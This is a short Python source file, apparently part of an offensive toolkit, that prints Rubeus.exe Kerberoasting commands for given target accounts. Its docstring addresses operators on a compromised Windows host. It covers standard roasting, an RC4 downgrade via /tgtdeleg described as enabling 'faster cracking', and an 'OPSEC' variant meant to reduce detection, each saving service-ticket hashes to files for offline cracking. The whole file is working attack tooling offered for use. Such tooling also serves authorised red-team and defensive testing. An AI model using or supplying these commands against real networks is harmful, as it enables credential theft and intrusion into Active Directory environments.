"""
Rubeus Command Generator — Prints Windows-based Kerberoast
commands for operators working from a compromised Windows host.

Covers standard, RC4-downgrade, and OPSEC-safe variants.
"""

from typing import List


class RubeusCommandGenerator:
    """Generate Rubeus.exe targeted Kerberoast commands."""

    @staticmethod
    def print_commands(targets: List[str]):
        """Print Rubeus commands for each target in three modes."""
        print(f"\n{'=' * 60}")
        print("RUBEUS TARGETED COMMANDS (Windows)")
        print(f"{'=' * 60}")

        print("\n[*] Standard targeted roast:")
        for t in targets:
            print(f"    Rubeus.exe kerberoast /user:{t} /outfile:{t}_hash.txt")

        print("\n[*] RC4 downgrade (faster cracking):")
        for t in targets:
            print(f"    Rubeus.exe kerberoast /user:{t} /tgtdeleg /outfile:{t}_rc4.txt")

        print("\n[*] OPSEC variant:")
        for t in targets:
            print(f"    Rubeus.exe kerberoast /user:{t} /rc4opsec /outfile:{t}_opsec.txt")